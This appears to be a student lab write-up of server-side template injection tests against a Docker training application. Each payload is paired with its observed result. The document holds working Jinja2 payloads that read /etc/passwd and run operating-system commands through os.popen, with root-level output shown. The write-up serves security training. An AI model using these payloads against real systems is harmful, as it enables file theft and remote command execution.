# Exercise 00 — Payloads and Observations

All tests documented here were performed against the provided Docker-based training application.

## 1. Template Expression Evaluation

**Payload:**

```jinja2
{{ 7 * 7 }}
```

**Observed result:**

The application returned `Hello, { 49 }!`.

**Purpose:** To check whether the template engine evaluates expressions supplied through the input field.

**Conclusion:** The arithmetic expression was evaluated by the server-side template engine.

## 2. Arithmetic Expression Evaluation

**Payload:**

```jinja2
{{ 10 + 5 }}
```

**Observed result:**

The application returned `Hello, { 15 }!`.

**Purpose:** To confirm the behavior using a second arithmetic expression.

**Conclusion:** The result confirms server-side expression evaluation.

## 3. Template Object Inspection

**Payload:**

```jinja2
{{ self }}
```

**Observed result:**

The application returned `Hello, { <TemplateReference None> }!`.

**Purpose:** To inspect a template-related object and gather evidence about the template engine.

**Conclusion:** The output was consistent with the Jinja2 template environment used by the application.

## 4. Sensitive File Disclosure — `/etc/passwd`

**Payload:**

```jinja2
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**Purpose:** To test whether the vulnerability could be used to read a file accessible to the application process.

**Observed result:** The application displayed the contents of `/etc/passwd`.

**Conclusion:** The payload demonstrated sensitive file disclosure within the provided Docker training environment.

## 5. Alternative File Disclosure Payload

**Payload:**

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
```

**Purpose:** To test an alternative path through the template context to access the operating system and read the target file.

**Observed result:** The application displayed the contents of `/etc/passwd`.

**Conclusion:** This payload also demonstrated file disclosure using a different object-access path.

## 6. Server-Side Command Execution

**Payload:**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Purpose:** To verify whether the vulnerable template context could execute an operating-system command.

**Observed result:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Conclusion:** The command executed with root privileges inside the Docker container. This does not, by itself, establish root access to the host machine.

## Overall Conclusion

The tests demonstrated server-side template expression evaluation, sensitive file disclosure, and operating-system command execution. These findings show that Server-Side Template Injection (SSTI) can have a serious impact when user-controlled input is interpreted as template source code.
